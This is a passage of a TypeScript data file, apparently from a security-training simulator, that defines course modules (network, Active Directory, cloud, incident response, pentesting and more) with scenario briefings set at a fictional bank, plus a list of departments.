    assignment: { briefing: 'A new PCI DSS audit cycle is approaching. Before the audit team arrives, you need to understand how card transactions flow through GFS infrastructure — from the moment a customer taps their card to the final settlement entry.', context: 'GFS processes 14.2 million card transactions daily. A single vulnerability in the payment flow could expose millions of cardholders.', priority: 'high', requestedBy: 'Nadia Petrov — Chief Compliance Officer', deadline: '2 weeks' },
    systemsInvolved: ['Core Banking — FIS Profile', 'Cards & Payments Platform', 'AWS Production'], mitreMapping: [],
  },
  {
    id: 'mod-03', number: 3, title: 'Network Security Operations', category: 'Infrastructure', description: 'TCP/IP, DNS, HTTP/S, routing, switching, network segmentation, and how GFS networks are designed with defense-in-depth.',
    estimatedHours: 12, difficulty: 'beginner', prerequisites: ['mod-01'], objectives: ['Analyze live network traffic with Wireshark', 'Map GFS network architecture and segmentation zones', 'Identify network-based attacks (ARP spoofing, DNS poisoning, MITM)', 'Configure basic firewall rules on Palo Alto'],
    unlocked: true, completed: false, progress: 0,
    assignment: { briefing: 'The network security team needs your help analyzing traffic patterns on the DMZ segment. Recent alerts suggest reconnaissance activity from within the network. You need to understand our network architecture to identify where the traffic is originating.', context: 'GFS operates a zero-trust network with 47 VLAN segments, micro-segmentation via NSX, and Palo Alto zone-based policies. Understanding the network topology is fundamental to every investigation.', priority: 'normal', requestedBy: 'Carlos Mendes — Network Security Lead', deadline: '1 week' },
    systemsInvolved: ['Palo Alto PA-7080 Cluster', 'DNS Infrastructure', 'Network Fabric'], mitreMapping: ['TA0043 Reconnaissance', 'TA0001 Initial Access'],
  },
  {
    id: 'mod-04', number: 4, title: 'Operating Systems Security', category: 'Infrastructure', description: 'Core OS concepts across Windows and Linux: process management, memory, file systems, permissions, and security primitives.',
    estimatedHours: 10, difficulty: 'beginner', prerequisites: [], objectives: ['Compare OS security architectures', 'Analyze running processes and detect anomalies', 'Understand file system permissions and ACLs', 'Identify OS-based attack vectors'],
    unlocked: true, completed: false, progress: 0,
    assignment: { briefing: 'Two alerts have been escalated from Tier 1 — one involves suspicious process activity on a Windows endpoint (WRK-LOAN-047), the other involves unauthorized cron jobs on a Linux server (APP-LOAN-02). You need to understand both operating systems to investigate.', context: 'GFS operates a mixed environment: 28,000 Windows endpoints, 4,200 Linux servers. Threat actors do not discriminate between platforms.', priority: 'high', requestedBy: 'Marcus Williams — Tier 3 SOC', deadline: '1 week' },
    systemsInvolved: ['WRK-LOAN-047', 'APP-LOAN-02', 'CrowdStrike Falcon'], mitreMapping: ['TA0002 Execution', 'TA0005 Defense Evasion'],
  },
  {
    id: 'mod-05', number: 5, title: 'Windows Security & Active Directory', category: 'Identity', description: 'Active Directory deep dive: Kerberos, NTLM, delegation, GPO attacks, and protecting the GFS identity backbone.',
    estimatedHours: 16, difficulty: 'advanced', prerequisites: ['mod-04'], objectives: ['Identify and map AD attack paths', 'Implement AD hardening controls', 'Detect Kerberoasting, DCSync, Golden Ticket attacks', 'Analyze Windows Event Logs for compromise indicators'],
    unlocked: false, completed: false, progress: 0,
    assignment: { briefing: 'Following the brute force attack on svc-integration@gfs.com (ALT-2024-8839), the team suspects the attacker may have obtained a Kerberos TGT. You need to audit the Active Directory environment for signs of identity compromise.', context: 'Active Directory is the crown jewels. If an attacker owns AD, they own everything. GFS has 40,000+ accounts in a single AD forest — the blast radius of AD compromise is the entire enterprise.', priority: 'urgent', requestedBy: 'Sarah Chen — SOC Manager', deadline: '48 hours' },
    systemsInvolved: ['Active Directory', 'Azure AD / Entra ID', 'Domain Controllers'], mitreMapping: ['TA0006 Credential Access', 'TA0003 Persistence', 'TA0008 Lateral Movement'],
  },
  {
    id: 'mod-06', number: 6, title: 'Linux Security & Hardening', category: 'Infrastructure', description: 'Linux security operations: SELinux, file permissions, service management, log analysis, and forensic investigation on GFS Linux servers.',
    estimatedHours: 14, difficulty: 'intermediate', prerequisites: ['mod-04'], objectives: ['Harden Linux server configurations', 'Analyze system and application logs for indicators of compromise', 'Perform forensic analysis of compromised Linux systems', 'Write security automation scripts in Bash and Python'],
    unlocked: false, completed: false, progress: 0,
    assignment: { briefing: 'The SQL injection alert (ALT-2024-8835) originated from APP-LOAN-02, a Linux-based application server. You need to analyze the server to determine the full scope of the compromise and identify persistence mechanisms.', context: 'APP-LOAN-02 runs the loan origination API that processes $400M in loan applications monthly. A compromise of this server could expose applicant PII and financial data.', priority: 'urgent', requestedBy: 'Li Wei — Security Engineer', deadline: '24 hours' },
    systemsInvolved: ['APP-LOAN-02', 'DB-LOAN-01', 'CrowdStrike Falcon'], mitreMapping: ['TA0002 Execution', 'TA0010 Exfiltration', 'TA0003 Persistence'],
  },
  {
    id: 'mod-07', number: 7, title: 'Virtualization Security', category: 'Infrastructure', description: 'VMware/Hyper-V hypervisor security, VM escape attacks, snapshot manipulation, and how GFS leverages virtualization across data centers.',
    estimatedHours: 8, difficulty: 'intermediate', prerequisites: ['mod-04'], objectives: ['Understand hypervisor attack surface and VM escape vectors', 'Secure VM environments with proper isolation', 'Monitor for VM-based lateral movement and escape attempts', 'Implement VM network segmentation and micro-segmentation'],
    unlocked: false, completed: false, progress: 0,
    assignment: { briefing: 'The GFS virtualization team has asked Security Engineering to review the VMware ESXi environment following reports of a new VMware vulnerability (CVE-2024-37085). You need to assess whether GFS hypervisors are vulnerable.', context: 'GFS operates 2,400+ virtual machines across 86 ESXi hosts in 2 data centers. A hypervisor escape could give an attacker access to every VM on the host — including core banking systems.', priority: 'high', requestedBy: 'Li Wei — Security Engineer', deadline: '3 days' },
    systemsInvolved: ['VMware vCenter', 'ESXi Hosts', 'Core Banking VMs'], mitreMapping: ['TA0004 Privilege Escalation'],
  },
  {
    id: 'mod-08', number: 8, title: 'Container Security', category: 'Cloud', description: 'Docker security, container vulnerabilities, image scanning, runtime protection, and GFS container security standards.',
    estimatedHours: 10, difficulty: 'intermediate', prerequisites: ['mod-06'], objectives: ['Secure Docker image builds with base image scanning', 'Implement runtime security monitoring for containers', 'Understand container escape techniques and defenses', 'Configure container admission controllers and Pod Security Standards'],
    unlocked: false, completed: false, progress: 0,
    assignment: { briefing: 'The Platform Engineering team is deploying 23 new microservices to the AKS production cluster. Before deployment, they need a security review of the container images and runtime configurations.', context: 'Container images are the new software supply chain. A vulnerable base image or misconfigured container can be the entry point to our Kubernetes cluster — and from there, to production banking systems.', priority: 'normal', requestedBy: 'Wei Zhang — Platform Engineering', deadline: '1 week' },
    systemsInvolved: ['Kubernetes — AKS Production', 'Azure Container Registry', 'Istio Service Mesh'], mitreMapping: ['TA0001 Initial Access', 'TA0005 Defense Evasion'],
  },
  {
    id: 'mod-09', number: 9, title: 'Kubernetes Security', category: 'Cloud', description: 'K8s RBAC, network policies, secrets management, API server security, and securing the GFS AKS clusters.',
    estimatedHours: 12, difficulty: 'advanced', prerequisites: ['mod-08'], objectives: ['Harden Kubernetes cluster configurations per CIS benchmarks', 'Implement RBAC policies with least privilege', 'Secure secrets with HashiCorp Vault integration', 'Monitor Kubernetes security events and audit logs'],
    unlocked: false, completed: false, progress: 0,
    assignment: { briefing: 'The AKS cluster (sys-011) is currently experiencing issues, and the Platform Engineering team suspects unauthorized access to the Kubernetes API server. You need to audit RBAC permissions and review API server audit logs.', context: 'The AKS production cluster runs 452 microservices, including the Digital Banking mobile API and payments processing pipeline. Kubernetes API access equals access to production workloads.', priority: 'urgent', requestedBy: 'Wei Zhang — Platform Engineering', deadline: '24 hours' },
    systemsInvolved: ['Kubernetes — AKS Production', 'HashiCorp Vault', 'Istio Service Mesh'], mitreMapping: ['TA0004 Privilege Escalation', 'TA0008 Lateral Movement'],
  },
  {
    id: 'mod-10', number: 10, title: 'Threat Intelligence Operations', category: 'Security', description: 'CTI frameworks, threat actor profiles, IOC lifecycle management, intelligence-driven defense, and GFS threat landscape.',
    estimatedHours: 10, difficulty: 'intermediate', prerequisites: [], objectives: ['Analyze threat intelligence from multiple sources', 'Map threat actors to MITRE ATT&CK techniques', 'Manage IOC feeds and automated enrichment', 'Produce intelligence assessments for GFS leadership'],
    unlocked: false, completed: false, progress: 0,
    assignment: { briefing: 'The threat intelligence team has identified indicators linking the data exfiltration alert (ALT-2024-8841) to the "Silk Typhoon" APT group. You need to research this group, map their known techniques, and assess the risk to GFS.', context: 'Silk Typhoon has been observed targeting financial institutions for IP theft and financial fraud. Understanding their TTPs allows us to proactively hunt for their presence in our environment.', priority: 'high', requestedBy: "James O'Brien — TI Analyst", deadline: '3 days' },
    systemsInvolved: ['Microsoft Sentinel', 'Threat Intel Feeds'], mitreMapping: ['All MITRE ATT&CK Tactics'],
  },
  {
    id: 'mod-11', number: 11, title: 'SIEM Operations & Detection Engineering', category: 'SOC', description: 'Microsoft Sentinel deep dive: KQL queries, correlation rules, workbooks, automation, and SOC analytics at GFS.',
    estimatedHours: 16, difficulty: 'intermediate', prerequisites: ['mod-03'], objectives: ['Build advanced KQL detection queries', 'Create and tune correlation rules for GFS-specific threats', 'Develop operational security workbooks', 'Implement automated response with Logic Apps'],
    unlocked: false, completed: false, progress: 0,
    assignment: { briefing: 'The SOC needs new detection rules for the DNS tunneling technique observed in ALT-2024-8836. Existing rules missed the initial activity. You need to write KQL queries that detect DNS tunneling patterns.', context: 'Our current DNS tunneling detection has a 70% true positive rate. The team needs this improved to 95%+ while reducing false positives that contribute to alert fatigue.', priority: 'high', requestedBy: 'Sarah Chen — SOC Manager', deadline: '1 week' },
    systemsInvolved: ['Microsoft Sentinel', 'Palo Alto Firewall', 'DNS Infrastructure'], mitreMapping: ['TA0011 Command and Control', 'TA0010 Exfiltration'],
  },
  {
    id: 'mod-12', number: 12, title: 'EDR Operations & Endpoint Security', category: 'SOC', description: 'CrowdStrike Falcon deep dive: live response, investigation, threat hunting queries, and remediation across GFS endpoints.',
    estimatedHours: 12, difficulty: 'intermediate', prerequisites: ['mod-04'], objectives: ['Investigate endpoint alerts in Falcon console', 'Perform live response sessions on compromised endpoints', 'Hunt for advanced threats using Falcon queries', 'Create custom IOA and IOC detection rules'],
    unlocked: false, completed: false, progress: 0,
    assignment: { briefing: 'WRK-LOAN-047 (ALT-2024-8840) has been isolated but the Falcon investigation shows the Cobalt Strike beacon may have migrated to other endpoints before containment. You need to hunt for the beacon across the loan department.', context: 'Ransomware is the #1 threat to GFS operations. The average dwell time before encryption is 4.2 hours. We need to identify every compromised endpoint before the attackers execute their payload.', priority: 'urgent', requestedBy: 'Marcus Williams — Tier 3 SOC', deadline: '6 hours' },
    systemsInvolved: ['CrowdStrike Falcon', 'WRK-LOAN-047', 'DFS-LOAN-SHARE'], mitreMapping: ['TA0002 Execution', 'TA0008 Lateral Movement', 'TA0040 Impact'],
  },
  {
    id: 'mod-13', number: 13, title: 'Firewall Operations & Network Defense', category: 'Security', description: 'Next-gen firewall management, rule optimization, threat prevention, SSL decryption, and GFS perimeter defense operations.',
    estimatedHours: 12, difficulty: 'intermediate', prerequisites: ['mod-03'], objectives: ['Manage and optimize Palo Alto security rule sets', 'Implement threat prevention profiles and URL filtering', 'Analyze firewall logs for attack patterns', 'Configure SSL decryption for inspection'],
    unlocked: false, completed: false, progress: 0,
    assignment: { briefing: 'The firewall team needs help analyzing the 2,847 security policy rules. Many are outdated or overly permissive. You need to review rule sets for the DMZ zone and identify unused or shadowed rules.', context: 'Firewall rule sprawl is a significant security risk. Every unnecessary rule is a potential attack path. GFS compliance requires quarterly rule review.', priority: 'normal', requestedBy: 'Carlos Mendes — Network Security Lead', deadline: '2 weeks' },
    systemsInvolved: ['Palo Alto PA-7080 Cluster', 'Panorama', 'Threat Intelligence Feeds'], mitreMapping: ['TA0001 Initial Access', 'TA0009 Collection'],
  },
  {
    id: 'mod-14', number: 14, title: 'Cloud Security — Azure & AWS', category: 'Cloud', description: 'Multi-cloud security architecture: Azure Defender, AWS GuardDuty, CSPM, CWPP, and securing GFS hybrid infrastructure.',
    estimatedHours: 14, difficulty: 'advanced', prerequisites: ['mod-03', 'mod-05'], objectives: ['Implement Azure security policies and Defender for Cloud', 'Configure AWS GuardDuty and Security Hub', 'Design secure hybrid cloud architectures', 'Audit cloud configurations for misconfigurations'],
    unlocked: false, completed: false, progress: 0,
    assignment: { briefing: 'Elena Volkov is auditing S3 bucket policies in AWS production and has found 12 buckets with public read access. You need to assist with the cloud security audit across both Azure and AWS environments.', context: 'Cloud misconfiguration is the #1 cause of cloud breaches. GFS moved 40% of workloads to cloud in the last year. Our cloud security posture must match our on-prem standards.', priority: 'high', requestedBy: 'Elena Volkov — Cloud Security Engineer', deadline: '1 week' },
    systemsInvolved: ['AWS Production', 'Azure Subscriptions', 'Azure AD', 'GuardDuty', 'Defender for Cloud'], mitreMapping: ['TA0010 Exfiltration', 'TA0004 Privilege Escalation'],
  },
  {
    id: 'mod-15', number: 15, title: 'Incident Response', category: 'Operations', description: 'NIST IR lifecycle, containment strategies, eradication, recovery, communications, and leading IR at GFS scale.',
    estimatedHours: 14, difficulty: 'advanced', prerequisites: ['mod-11', 'mod-12'], objectives: ['Lead an incident response from detection to recovery', 'Implement containment strategies for different threat types', 'Coordinate cross-functional response teams', 'Write executive incident reports and post-mortems'],
    unlocked: false, completed: false, progress: 0,
    assignment: { briefing: 'A critical incident is unfolding. Multiple alerts (ALT-2024-8838 through ALT-2024-8841) may be connected. Sarah Chen has asked you to join the incident response team as the junior analyst. You will shadow the response and document all actions.', context: 'This is a real-time exercise. The incident may involve account compromise, data exfiltration, ransomware, and phishing. You are part of the team defending GFS.', priority: 'urgent', requestedBy: 'Sarah Chen — SOC Manager / Incident Commander', deadline: 'IMMEDIATE' },
    systemsInvolved: ['All affected systems'], mitreMapping: ['Full MITRE ATT&CK Lifecycle'],
  },
  {
    id: 'mod-16', number: 16, title: 'Digital Forensics', category: 'Operations', description: 'Forensic acquisition, memory analysis (Volatility), disk forensics (Autopsy), network forensics, and evidence handling.',
    estimatedHours: 16, difficulty: 'advanced', prerequisites: ['mod-15', 'mod-06'], objectives: ['Acquire forensic images of disks and memory', 'Analyze memory dumps for malware artifacts', 'Reconstruct attack timelines from multiple evidence sources', 'Maintain chain of custody for legal proceedings'],
    unlocked: false, completed: false, progress: 0,
    assignment: { briefing: 'WRK-LOAN-047 has been seized for forensic analysis following the ransomware incident. You need to acquire a forensic memory image and disk image, then analyze them to determine the initial access vector.', context: 'This evidence may be used in legal proceedings against the attackers. Every step must follow GFS forensic procedures and maintain chain of custody.', priority: 'urgent', requestedBy: 'Priya Sharma — Incident Responder', deadline: '24 hours' },
    systemsInvolved: ['WRK-LOAN-047', 'Forensic Workstation', 'Evidence Storage'], mitreMapping: ['TA0001 Initial Access', 'TA0002 Execution'],
  },
  {
    id: 'mod-17', number: 17, title: 'SOC Operations & Workflow', category: 'SOC', description: 'Running the 24/7 SOC: triage procedures, escalation paths, shift handover, KPIs, and continuous improvement.',
    estimatedHours: 12, difficulty: 'intermediate', prerequisites: ['mod-11', 'mod-12'], objectives: ['Perform L1 alert triage using GFS procedures', 'Manage escalation and de-escalation workflows', 'Calculate and present SOC metrics (MTTD, MTTR, FP rate)', 'Conduct structured shift handovers'],
    unlocked: false, completed: false, progress: 0,
    assignment: { briefing: 'You are shadowing the Day Shift SOC team. Today you will observe the triage process, assist with alert classification, and participate in the shift handover to Evening Shift at 18:00.', context: 'The SOC operates 24/7/365. GFS never sleeps. Shift handovers are critical — information lost during handover can mean the difference between catching an attack and missing it.', priority: 'normal', requestedBy: 'Sarah Chen — SOC Manager', deadline: 'Today' },
    systemsInvolved: ['Microsoft Sentinel', 'CrowdStrike Falcon', 'ServiceNow'], mitreMapping: [],
  },
  {
    id: 'mod-18', number: 18, title: 'Vulnerability Management', category: 'Security', description: 'Asset discovery, vulnerability scanning, risk-based prioritization (VPR), SLA management, and GFS patching operations.',
    estimatedHours: 10, difficulty: 'intermediate', prerequisites: ['mod-03', 'mod-04'], objectives: ['Manage the vulnerability lifecycle from discovery to remediation', 'Implement risk-based prioritization using VPR scores', 'Track and enforce remediation SLAs across business units', 'Report vulnerability posture to executive leadership'],
    unlocked: false, completed: false, progress: 0,
    assignment: { briefing: 'The latest Qualys scan found 2 critical CVEs (CVE-2024-38077 and CVE-2024-30088) affecting 8 and 12 assets respectively. Per GFS policy, critical vulnerabilities must be patched within 24 hours. You need to coordinate remediation.', context: 'These vulnerabilities allow Remote Code Execution and Elevation of Privilege. If exploited, an attacker could gain admin access to critical application servers. The clock is ticking.', priority: 'urgent', requestedBy: 'Raj Krishnan — Vulnerability Management Lead', deadline: '24 hours' },
    systemsInvolved: ['Qualys VMDR', 'ServiceNow', 'Palo Alto Firewall'], mitreMapping: ['TA0004 Privilege Escalation', 'TA0002 Execution'],
  },
  {
    id: 'mod-19', number: 19, title: 'Ethical Hacking & Penetration Testing', category: 'Offensive', description: 'Penetration testing methodology (PTES/OSSTMM), reconnaissance, exploitation, post-exploitation, and professional reporting.',
    estimatedHours: 20, difficulty: 'advanced', prerequisites: ['mod-03', 'mod-04', 'mod-05', 'mod-06'], objectives: ['Execute a full penetration test following PTES methodology', 'Exploit common enterprise vulnerabilities', 'Perform privilege escalation on Windows and Linux', 'Write professional penetration testing reports'],
    unlocked: false, completed: false, progress: 0,
    assignment: { briefing: 'Fatima Al-Hassan has authorized you to participate in the upcoming quarterly penetration test of the GFS Digital Banking web application. Before the test begins, you need to complete the methodology training.', context: 'Our red team must be better than the real attackers. GFS is targeted by sophisticated threat groups daily. Your offensive skills directly improve our defensive posture.', priority: 'normal', requestedBy: 'Fatima Al-Hassan — VAPT Lead', deadline: '2 weeks' },
    systemsInvolved: ['Digital Banking Platform', 'AWS Production', 'GFS Network'], mitreMapping: ['All MITRE ATT&CK — Offensive Tactics'],
  },
  {
    id: 'mod-20', number: 20, title: 'Threat Hunting', category: 'Operations', description: 'Hypothesis-driven hunting, advanced detection queries, behavioral analysis, and proactive threat discovery across the enterprise.',
    estimatedHours: 14, difficulty: 'advanced', prerequisites: ['mod-11', 'mod-12', 'mod-10'], objectives: ['Formulate hunt hypotheses based on threat intelligence', 'Build advanced KQL and Splunk detection queries', 'Analyze behavioral patterns to discover unknown threats', 'Document and report hunt findings with evidence'],
    unlocked: false, completed: false, progress: 0,
    assignment: { briefing: 'Based on the Silk Typhoon indicators from ALT-2024-8841, James O\'Brien has developed a hunt hypothesis: the group may have established additional persistence mechanisms that our automated detections have not caught. You are joining the hunt.', context: 'Threat hunting is the proactive search for adversaries already in our environment. We assume breach and hunt to find what automated tools miss.', priority: 'high', requestedBy: 'Marcus Williams — Threat Hunting Lead', deadline: '1 week' },
    systemsInvolved: ['Microsoft Sentinel', 'Splunk', 'CrowdStrike Falcon'], mitreMapping: ['TA0007 Discovery', 'TA0043 Reconnaissance'],
  },
  {
    id: 'mod-21', number: 21, title: 'Web Application Security', category: 'Offensive', description: 'OWASP Top 10, web application testing, API security, authentication flaws, and securing GFS customer-facing applications.',
    estimatedHours: 14, difficulty: 'advanced', prerequisites: ['mod-19'], objectives: ['Identify and exploit OWASP Top 10 vulnerabilities', 'Test web applications for business logic flaws', 'Assess API security and authentication mechanisms', 'Recommend remediations with code-level guidance'],
    unlocked: false, completed: false, progress: 0,
    assignment: { briefing: 'The Digital Banking team has deployed a new loan application portal. Before the next release, the VAPT team needs you to test it for web application vulnerabilities, including the SQL injection patterns observed in ALT-2024-8835.', context: 'This portal handles loan applications for 4.2 million customers. A web vulnerability could expose customer PII, financial data, or allow unauthorized loan approvals.', priority: 'high', requestedBy: 'Fatima Al-Hassan — VAPT Lead', deadline: '1 week' },
    systemsInvolved: ['Digital Banking Platform', 'APP-LOAN-02', 'WAF'], mitreMapping: ['TA0001 Initial Access', 'TA0009 Collection'],
  },
  {
    id: 'mod-22', number: 22, title: 'Purple Team Operations', category: 'Offensive', description: 'Offensive-defensive collaboration, MITRE ATT&CK-based testing (Atomic Red Team), detection engineering, and continuous validation.',
    estimatedHours: 14, difficulty: 'expert', prerequisites: ['mod-19', 'mod-11', 'mod-12'], objectives: ['Design purple team exercises mapped to MITRE ATT&CK', 'Execute atomic tests to validate detection rules', 'Measure detection coverage across attack techniques', 'Improve security controls based on gap analysis'],
    unlocked: false, completed: false, progress: 0,
    assignment: { briefing: 'The CISO has mandated a purple team exercise to validate the detection coverage of our SOC following the recent Silk Typhoon activity. You will work with both the red team and blue team to test detections.', context: 'Purple teaming ensures our defenses actually work against real attack techniques. We cannot afford gaps in detection when the enterprise is under active threat.', priority: 'high', requestedBy: 'Sarah Chen — SOC Manager / CISO', deadline: '2 weeks' },
    systemsInvolved: ['All SOC tools', 'Red Team Infrastructure', 'Testing Lab'], mitreMapping: ['Full MITRE ATT&CK Matrix'],
  },
  {
    id: 'mod-23', number: 23, title: 'Enterprise Risk Management', category: 'Governance', description: 'Risk frameworks (NIST CSF, ISO 27005), quantitative risk analysis, risk appetite, and risk management in financial services.',
    estimatedHours: 10, difficulty: 'intermediate', prerequisites: [], objectives: ['Assess enterprise risk using quantitative methods', 'Calculate risk metrics (ALE, ARO, SLE)', 'Present risk assessments to executive leadership', 'Maintain the GFS risk register'],
    unlocked: false, completed: false, progress: 0,
    assignment: { briefing: 'Thomas Burke (CRO) needs a risk assessment for the recent Silk Typhoon activity. You need to quantify the risk to GFS and present a recommendation to the Risk Committee.', context: 'Risk management drives every security decision at GFS. The board needs to understand exposure in business terms — dollars, regulatory impact, and reputation.', priority: 'high', requestedBy: 'Thomas Burke — Chief Risk Officer', deadline: '1 week' },
    systemsInvolved: ['Risk Register', 'ServiceNow'], mitreMapping: [],
  },
  {
    id: 'mod-24', number: 24, title: 'Compliance & Regulatory', category: 'Governance', description: 'PCI DSS, SOX, GLBA, GDPR, and maintaining compliance posture across all GFS operations and business units.',
    estimatedHours: 10, difficulty: 'intermediate', prerequisites: ['mod-23'], objectives: ['Understand regulatory requirements affecting GFS', 'Map security controls to compliance frameworks', 'Prepare evidence for regulatory audits', 'Maintain compliance dashboards and reporting'],
    unlocked: false, completed: false, progress: 0,
    assignment: { briefing: 'The PCI DSS v4.0 audit is in 6 weeks. Nadia Petrov needs your help gathering evidence for Requirement 6 (Secure Development) and Requirement 11 (Regular Testing). You need to review GFS controls against the new requirements.', context: 'GFS processes 14.2 million card transactions daily. PCI DSS compliance is not optional — a violation could result in fines up to $100,000 per month and loss of card processing privileges.', priority: 'high', requestedBy: 'Nadia Petrov — Chief Compliance Officer', deadline: '2 weeks' },
    systemsInvolved: ['All GFS systems', 'PCI DSS Scope', 'ServiceNow'], mitreMapping: [],
  },
  {
    id: 'mod-25', number: 25, title: 'Email Security & Social Engineering', category: 'Security', description: 'Email threat landscape, phishing analysis, BEC prevention, and securing GFS communication channels against social engineering.',
    estimatedHours: 8, difficulty: 'intermediate', prerequisites: [], objectives: ['Analyze and triage phishing emails', 'Investigate Business Email Compromise attempts', 'Configure email security controls', 'Train users on social engineering awareness'],
    unlocked: false, completed: false, progress: 0,
    assignment: { briefing: 'Following ALT-2024-8837 (OAuth consent phishing) and ALT-2024-8838 (PowerShell payload delivery), you need to trace the initial phishing email that compromised j.patterson and determine if other employees received the same email.', context: 'Social engineering remains the #1 initial access vector at GFS. The phishing email targeting j.patterson may be part of a wider campaign targeting the finance department.', priority: 'urgent', requestedBy: "James O'Brien — TI Analyst", deadline: '12 hours' },
    systemsInvolved: ['Exchange Online', 'Defender for O365', 'Azure AD'], mitreMapping: ['TA0001 Initial Access', 'TA0043 Reconnaissance'],
  },
  {
    id: 'mod-26', number: 26, title: 'Malware Analysis', category: 'Operations', description: 'Static analysis, dynamic analysis, sandbox operations, reverse engineering fundamentals, and malware intelligence.',
    estimatedHours: 16, difficulty: 'expert', prerequisites: ['mod-04', 'mod-06'], objectives: ['Perform static analysis of malware samples', 'Execute dynamic analysis in sandboxed environments', 'Identify malware families and extract IOCs', 'Produce malware analysis reports for the TI team'],
    unlocked: false, completed: false, progress: 0,
    assignment: { briefing: 'The stage2.ps1 payload from ALT-2024-8838 has been submitted to the malware sandbox. The TI team needs a detailed analysis of the payload to extract IOCs and understand its capabilities.', context: 'Understanding the malware helps us build better detections. Every IOC extracted improves protection across the entire GFS enterprise.', priority: 'high', requestedBy: "James O'Brien — TI Analyst", deadline: '3 days' },
    systemsInvolved: ['Malware Sandbox', 'Threat Intelligence Platform'], mitreMapping: ['TA0002 Execution', 'TA0005 Defense Evasion', 'TA0011 Command and Control'],
  },
  {
    id: 'mod-27', number: 27, title: 'Identity Security & Zero Trust', category: 'Identity', description: 'Zero trust architecture, privileged access management (PAM), identity governance (IGA), and protecting identity as the new perimeter.',
    estimatedHours: 12, difficulty: 'advanced', prerequisites: ['mod-05'], objectives: ['Design and implement zero trust architecture', 'Manage privileged access with PAM tools', 'Detect identity-based attacks (token theft, MFA bypass)', 'Design identity governance workflows'],
    unlocked: false, completed: false, progress: 0,
    assignment: { briefing: 'Following the service account compromise (ALT-2024-8839), the identity team needs a comprehensive review of all service accounts in GFS. There are 2,847 service accounts and many have excessive permissions.', context: 'Service accounts are the most common vector for lateral movement. Unlike human users, they rarely have MFA and often have standing admin privileges. We need to apply zero trust principles to our identity infrastructure.', priority: 'high', requestedBy: 'Tom Reeves — Identity Management Lead', deadline: '2 weeks' },
    systemsInvolved: ['Active Directory', 'Azure AD / Entra ID', 'PAM Solution', 'Conditional Access'], mitreMapping: ['TA0006 Credential Access', 'TA0004 Privilege Escalation', 'TA0003 Persistence'],
  },
  {
    id: 'mod-28', number: 28, title: 'AI for Cybersecurity', category: 'Advanced', description: 'Machine learning for anomaly detection, AI-powered SOAR, LLM security risks, and adversarial AI in the enterprise context.',
    estimatedHours: 12, difficulty: 'expert', prerequisites: ['mod-11', 'mod-10'], objectives: ['Apply ML models to detect behavioral anomalies', 'Deploy AI-powered automation in SOC workflows', 'Assess AI/LLM security risks to the enterprise', 'Build AI-based detection and response capabilities'],
    unlocked: false, completed: false, progress: 0,
    assignment: { briefing: 'The SOC is evaluating Microsoft Sentinel\'s new AI-powered anomaly detection capabilities. You need to pilot the feature and assess whether it would have detected the Silk Typhoon activity earlier.', context: 'AI is transforming security operations. We need to understand both the opportunities and the risks — including adversarial AI that attackers may use against us.', priority: 'normal', requestedBy: 'Sarah Chen — SOC Manager', deadline: '2 weeks' },
    systemsInvolved: ['Microsoft Sentinel', 'AI/ML Pipeline'], mitreMapping: [],
  },
  {
    id: 'mod-29', number: 29, title: 'Capstone — Enterprise Incident', category: 'Advanced', description: 'Full-scale enterprise cyberattack simulation. Lead the response, manage stakeholders, protect GFS, and deliver the post-incident review.',
    estimatedHours: 40, difficulty: 'expert', prerequisites: ['mod-15', 'mod-16', 'mod-20', 'mod-22'], objectives: ['Lead enterprise-wide incident response coordination', 'Make real-time business-critical decisions under pressure', 'Coordinate with legal, PR, regulatory, and executive teams', 'Deliver a comprehensive post-incident review'],
    unlocked: false, completed: false, progress: 0,
    assignment: { briefing: 'This is the ultimate test. A coordinated attack is underway targeting GFS. Multiple systems are compromised. The board is watching. The regulators will ask questions. You are leading the defense.', context: 'This capstone simulation exercises every skill you have developed at GFS. You will face a realistic, multi-stage attack that requires technical expertise, business judgment, and leadership.', priority: 'urgent', requestedBy: 'Sarah Chen — SOC Manager / CISO', deadline: 'IMMEDIATE' },
    systemsInvolved: ['ALL GFS Systems'], mitreMapping: ['Full MITRE ATT&CK — All Tactics'],
  },
];

export const DEPARTMENTS: Department[] = [
  { id: 'dept-01', name: 'Retail Banking', head: 'Margaret Liu', headTitle: 'Head of Retail Banking', employees: 8500, description: 'Consumer banking, savings, mortgages, and branch operations across 350+ locations.', type: 'business' },
  { id: 'dept-02', name: 'Corporate Banking', head: 'Robert Hartley', headTitle: 'Head of Corporate Banking', employees: 3200, description: 'Business banking, corporate lending, treasury services, and institutional relationships.', type: 'business' },
  { id: 'dept-03', name: 'Cards & Payments', head: 'Ana Rodriguez', headTitle: 'Head of Cards & Payments', employees: 2800, description: 'Credit cards, debit cards, payment processing, and digital wallet services.', type: 'business' },
  { id: 'dept-04', name: 'Treasury', head: 'Hiroshi Tanaka', headTitle: 'Chief Investment Officer', employees: 450, description: 'Investment management, liquidity, capital markets, and risk hedging.', type: 'business' },
  { id: 'dept-05', name: 'Insurance', head: 'Patricia Okafor', headTitle: 'Head of Insurance', employees: 4200, description: 'Life insurance, property & casualty, underwriting, and claims processing.', type: 'business' },
  { id: 'dept-06', name: 'Digital Banking', head: 'Kevin Park', headTitle: 'Chief Digital Officer', employees: 1800, description: 'Mobile banking, online platforms, fintech partnerships, and digital innovation.', type: 'business' },
  { id: 'dept-07', name: 'Technology', head: 'Dr. Raj Patel', headTitle: 'Chief Technology Officer', employees: 6500, description: 'Infrastructure, cloud operations, application development, and enterprise architecture.', type: 'technology' },
  { id: 'dept-08', name: 'Cybersecurity Division', head: 'Sarah Chen', headTitle: 'Chief Information Security Officer', employees: 380, description: 'Security operations, threat intelligence, risk management, and security engineering.', type: 'security' },
  { id: 'dept-09', name: 'SOC', head: 'Sarah Chen', headTitle: 'SOC Manager', employees: 65, description: '24/7 security monitoring, alert triage, and incident escalation.', type: 'security' },
  { id: 'dept-10', name: 'Risk Management', head: 'Thomas Burke', headTitle: 'Chief Risk Officer', employees: 520, description: 'Enterprise risk assessment, model validation, and risk reporting.', type: 'support' },
  { id: 'dept-11', name: 'Compliance', head: 'Nadia Petrov', headTitle: 'Chief Compliance Officer', employees: 340, description: 'Regulatory compliance, AML/KYC, audit coordination, and policy management.', type: 'support' },
  { id: 'dept-12', name: 'Human Resources', head: 'Diana Foster', headTitle: 'Chief People Officer', employees: 280, description: 'Talent management, employee relations, benefits, and organizational development.', type: 'support' },
];

export const ONBOARDING_STEPS: OnboardingStep[] = [
